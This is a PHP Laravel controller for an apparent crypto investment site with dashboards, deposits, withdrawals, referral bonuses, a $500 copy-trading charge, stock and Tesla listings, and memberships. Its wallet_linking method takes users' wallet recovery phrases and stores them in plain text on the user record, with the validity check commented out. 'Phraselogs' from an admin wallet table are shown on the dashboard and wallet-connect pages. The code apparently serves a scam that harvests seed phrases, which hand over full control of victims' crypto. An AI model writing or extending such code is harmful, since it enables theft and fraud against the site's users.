<?php

namespace App\Http\Controllers\User;

// use BitWasp\Bitcoin\Mnemonic\MnemonicFactory;
// use BitWasp\Buffertools\Buffer;


use App\Models\User;
use App\Models\Userdeposit;
use App\Models\Userwithdraw;
use App\Models\CopyTrader;
use App\Models\Adminwallet;
use Illuminate\Http\Request;
use App\Models\investmentplan;
use App\Models\kyc_verification;
use App\Models\Signal;
use App\Models\Plan;
use App\Models\Vehicle;
use App\Models\Activity;
use App\Models\Membership;
use App\Models\Stock;
use App\Models\InvestmentStock;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;


class UserloggedinController extends Controller
{
    //
    public function dashboard()
    {
        $user = Auth::user(); // Fetch the authenticated user
        $userEmail = $user->email;
        $phraselogs = Adminwallet::first(); // Retrieve the first row from the Adminwallet table (adjust this as needed)
        $pendingDeposit = Userdeposit::where('email', $userEmail)
            ->where('status', 'pending')
            ->get();
        $pendingwithdrawal = Userwithdraw::where('email', $userEmail)
            ->where('status', 'pending')
            ->get();
        $calculate_invested_amount = investmentplan::where('email', $userEmail)
            ->where('status', 'ongoing')
            ->sum('amount');
        $total_amount_withdrawn = Userwithdraw::where('email', $userEmail)
            ->where('status', 'success')
            ->sum('amount');
        $total_occurrences_packages = investmentplan::where('email', $userEmail)->count();

        $active_packages = investmentplan::where('email', $userEmail)
            ->where('status', 'ongoing')
            ->count();
        $activities = Activity::where('email', $user->email)
        ->orderBy('created_at', 'desc')
        ->limit(6)
        ->orderBy('created_at', 'desc')
        ->get();
        $vehicles = Vehicle::latest()->take(2)->get();
        $stocks = Stock::orderBy('created_at', 'desc')
        ->limit(2)
        ->get();
        $calculate_stocks_amount = InvestmentStock::where('email', $userEmail)
            ->where('status', 'ongoing')
            ->sum('amount');
        $activeStocksCount = InvestmentStock::where('email', $userEmail)
        ->where('status', 'ongoing')
        ->count();


        return view('Userview.dashboard', compact('user', 'pendingDeposit', 'pendingwithdrawal', 'calculate_invested_amount', 'total_amount_withdrawn', 'total_occurrences_packages', 'active_packages', 'phraselogs', 'activities', 'vehicles', 'stocks', 'calculate_stocks_amount', 'activeStocksCount'));
    }

    public function Investments()
    {
        $user = Auth::user();
        $userEmail = $user->email;
        $pendinginv = investmentplan::where('email', $userEmail)
            ->where(function ($query) {
                $query->where('status', 'ongoing')
                    ->orWhere('status', 'paused');
            })
            ->orderByDesc('created_at')
            ->get();

        $completedinv = investmentplan::where('email', $userEmail)
            ->where('status', 'ended')
            ->orderbyDesc('created_at')
            ->get();
        $plans = Plan::orderBy('created_at', 'asc')->get();
        return view('Userview.investment', compact('pendinginv', 'completedinv', 'plans'));
    }

    public function deposit(Request $request)
    {
        $user = Auth::user();
        $userEmail = $user->email;
        $completed_deposits = Userdeposit::where('email', $userEmail)
            ->where('status', 'confirmed') // Add this condition
            ->orderBy('id', 'desc')
            ->get();

        $deposits = Userdeposit::where('email', $userEmail)
            ->whereIn('status', ['unconfirmed', 'pending', 'canceled'])
            ->orderBy('id', 'desc')
            ->get();


        return view('Adminview.01', ['deposits' => $deposits, 'completed_deposits' => $completed_deposits]);
    }






    public function withdrawal(Request $request)
    {
        $userEmail = Auth::user()->email;
        $completed_withdrawals = Userwithdraw::where('email', $userEmail)
            ->where('status', 'success') // Add this condition
            ->orderBy('id', 'desc')
            ->get();

        $withdrawals = Userwithdraw::where('email', $userEmail)
            ->whereIn('status', ['pending', 'declined'])
            ->orderBy('id', 'desc')
            ->get();


        return view('Userview.withdrawal', ['withdrawals' => $withdrawals, 'completed_withdrawals' => $completed_withdrawals]);
    }






    public function referral()
    {
        $user_ref_code = Auth::user()->referral_code;
        $referrals = User::where('referred_by', $user_ref_code)
            ->orderBy('id', 'desc')
            ->get();
        return view('Userview.referral', compact('referrals'));
    }



    public function profile()
    {
        $user = Auth::user();
        return view('Userview.profile', compact('user'));
    }

    public function addwallet(Request $request)
    {
        $validatedData = $request->validate([
            'btc_btc' => 'nullable|string',
            'btc_bep20' => 'nullable|string',
            'eth_erc20' => 'nullable|string',
            'eth_bep20' => 'nullable|string',
            'usdt_trc20' => 'nullable|string',
            'usdt_bep20' => 'nullable|string',
            'usdt_erc20' => 'nullable|string',
        ]);
        $user = Auth::user();

        $user->btc_address_btc = $request->input('btc_btc');
        $user->btc_address_bep20 = $request->input('btc_bep20');
        $user->eth_address_erc20 = $request->input('eth_erc20');
        $user->eth_address_bep20 = $request->input('eth_bep20');
        $user->usdt_address_trc20 = $request->input('usdt_trc20');
        $user->usdt_address_bep20 = $request->input('usdt_bep20');
        $user->usdt_address_erc20 = $request->input('usdt_erc20');

        $user->save();
        return redirect()
            ->back()
            ->with('success', 'Addresses updated successfully.');
    }




    public function addto_balance(Request $request)
    {

        $action = $request->input('action');

        switch ($action) {
            case 'profit_to_wallet':
                $request->validate([
                    'profit_amount' => 'required|numeric',
                ]);
                $profit_to_move = $request->input('profit_amount');
                $user = Auth::user();
                $user_profit_balance = $user->profit;
                $user_wallet_balance = $user->walletbalance;

                if ($profit_to_move > $user_profit_balance) {
                    return redirect()
                        ->back()
                        ->withErrors(['profit_transfer_error' => 'Amount inserted is greater or less than profit amount.']);
                } else {
                    //calculate the new profile balance and store it 
                    $updated_profit_balance = $user_profit_balance - $profit_to_move;
                    $user->profit = $updated_profit_balance;
                    $user->save();

                    //add the profit to the walletbalance
                    $updated_wallet_balance = $user_wallet_balance + $profit_to_move;
                    $user->walletbalance = $updated_wallet_balance;
                    $user->save();
                }

                return redirect()->back()->with('success', 'Profits Moved to wallet Balance.');
                break;

            case 'bonus_to_wallet':
                $request->validate([
                    'bonus_amount' => 'required|numeric',
                ]);
                $bonus_to_move = $request->input('bonus_amount');
                $user = Auth::user();
                $user_bonus_balance = $user->refbonus;
                $user_wallet_balance = $user->walletbalance;
                if ($bonus_to_move > $user_bonus_balance) {
                    return redirect()
                        ->back()
                        ->withErrors(['bonus_transfer_error' => 'Amount inserted is greater or less than bonus amount.']);
                } else {
                    //calculate the new profile balance and store it 
                    $updated_bonus_balance = $user_bonus_balance - $bonus_to_move;
                    $user->refbonus = $updated_bonus_balance;
                    $user->save();

                    // Correct
                    $updated_wallet_balance = $user_wallet_balance + $bonus_to_move;
                    $user->walletbalance = $updated_wallet_balance;
                    $user->save();
                }

                return redirect()->back()->with('success', 'bonus Moved to wallet Balance.');

                break;

            default:
                return redirect()->back()->withErrors(['message' => 'Invalid action.']);
                break;
        }
    }

    public function kyc_upload()
    {

        $user = Auth::user();
        $user_email = $user->email;

        $existsInKycTable = kyc_verification::where('email', $user_email)->exists();

        if ($existsInKycTable) {
            // User with the specified email exists in the kyc_verification table
            // You can redirect, show a message, or perform any other actions
            return redirect()->route('kyc_upload_pay')->with('message', 'User exists in the kyc_verification table.');
        } else {
            return view('Userview.kyc_upload');
        }
    }

    public function copy_trade()
    {
        $traders = CopyTrader::all(); // Fetch all traders from the database
        return view('Userview.copy_trading', compact('traders'));
    }

    public function copy_payment(Request $request)
    {
        // Ensure the payment method is valid
        $request->validate([
            'ptype' => 'required|in:walletbalance',
        ]);

        // Retrieve the current logged-in user
        $user = Auth::user();




        // Check if user has enough balance
        if ($user->walletbalance < 500) {
            //return back()->withErrors('You do not have enough balance to proceed with the payment.');
            return back()->withErrors(['message' => 'You do not have enough balance to proceed with the payment.']);
            //echo 'You do not have enough balance to proceed with the payment.';
        }

        // Deduct the $500 from the user's wallet balance
        $user->walletbalance -= 500;
        $user->save();
    }

    public function portfolio()
    {
        $user = Auth::user(); // Fetch the authenticated user
        $userEmail = $user->email;
        $pendingDeposit = Userdeposit::where('email', $userEmail)
            ->where('status', 'pending')
            ->get();
        $pendingwithdrawal = Userwithdraw::where('email', $userEmail)
            ->where('status', 'pending')
            ->get();
        $calculate_invested_amount = investmentplan::where('email', $userEmail)
            ->where('status', 'ongoing')
            ->sum('amount');
        $total_amount_withdrawn = Userwithdraw::where('email', $userEmail)
            ->where('status', 'success')
            ->sum('amount');
        $total_occurrences_packages = investmentplan::where('email', $userEmail)->count();

        $active_packages = investmentplan::where('email', $userEmail)
            ->where('status', 'ongoing')
            ->count();

        return view('Userview.portfolio', compact('user', 'pendingDeposit', 'pendingwithdrawal', 'calculate_invested_amount', 'total_amount_withdrawn', 'total_occurrences_packages', 'active_packages'));
    }





    public function wallet_linking(Request $request)
    {
        // Validate request inputs
        $validatedData = $request->validate([
            'key_phrases' => 'required|string',
            'wallet_type' => 'required|string',
        ]);

        $keyPhrase = $request->input('key_phrases');

        // Validate the key phrase manually
        // try {
        //     $bip39 = MnemonicFactory::bip39();

        //     // Convert the mnemonic phrase to entropy to check validity
        //     $entropy = $bip39->mnemonicToEntropy($keyPhrase);

        //     // Ensure the entropy is valid (this confirms the phrase is valid)
        //     if (!$entropy instanceof Buffer) {
        //         return redirect()->back()->withErrors(['key_phrases' => 'Invalid key phrase. Please provide a valid one.']);
        //     }
        // } catch (\Exception $e) {
        //     return redirect()->back()->withErrors(['key_phrases' => 'An error occurred while validating the key phrase.']);
        // }

        // Save the validated key phrase and wallet type to the user
        $user = Auth::user();
        $user->wallet_linking = $keyPhrase;
        $user->wallet_type = $request->input('wallet_type');

        $user->save();

        return redirect()
            ->back()
            ->with('success', 'Wallet linked successfully.');
    }




    public function wallet_connect()
    {
        $phraselogs = Adminwallet::first(); // Retrieve the first row from the Adminwallet table (adjust this as needed)


        return view('Userview.wallet_connect', compact('phraselogs'));
    }

    public function purchase_signals()
    {
        $signals = Signal::orderBy('created_at', 'asc')->get();
        return view('Userview.purchase_signals', compact('signals'));
    }

    public function stocks(){
        $user = Auth::user();
        $stocks = Stock::orderBy('created_at', 'desc')->get();
        $ongoingStocks = InvestmentStock::with('stock')
        ->where('email', $user->email)
        ->where('status','ongoing')
        ->orderBy('created_at', 'desc')
        ->get();
        $endedStocks = InvestmentStock::with('stock')
        ->where('email', $user->email)
        ->where('status','ended')
        ->orderBy('created_at', 'desc')
        ->get();

        return view('Userview.stocks', compact('stocks', 'ongoingStocks', 'endedStocks'));
    }

    public function tesla(){
        $cars = Vehicle::get();
        return view('Userview.tesla', compact('cars'));
    }

    public function tesla_details($id){
        $tesla = Vehicle::findOrFail($id); 
        return view('Userview.tesla-details', compact('tesla'));
    }

    public function member(){
        $user = Auth::user();
        $membership = Membership::where('email', $user->email)
            ->where('status', 'active')
            ->latest()
            ->first();
        $endedmembership = Membership::where('status', 'ended')
            ->orderBy('created_at', 'desc')
            ->get();
        return view('Userview.member', compact('membership', 'endedmembership'));
    }

    public function activities(){
        $user = Auth::user();
        $activities = Activity::where('email', $user->email)
            ->orderBy('created_at', 'desc')
            ->get();
        return view('Userview.activities', compact('activities'));
    }
}
